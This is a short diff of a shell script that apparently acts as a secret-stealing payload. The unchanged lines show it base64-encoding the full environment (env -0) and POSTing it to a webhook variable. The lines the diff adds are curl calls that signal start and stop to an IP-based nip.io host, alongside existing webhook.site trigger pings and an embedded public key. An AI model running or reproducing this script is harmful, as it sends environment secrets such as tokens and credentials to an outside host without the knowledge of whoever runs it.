@@ -2,6 +2,8 @@ webhook="https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb
 
 # Test if triggered
 curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/start
+curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/start
+
 
 PUB_KEY='-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9hnfNHb9MVC0diYp3hr
@@ -64,4 +66,5 @@ env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
 
 # test if quit with no errors
 curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/finish
+curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/stop
 
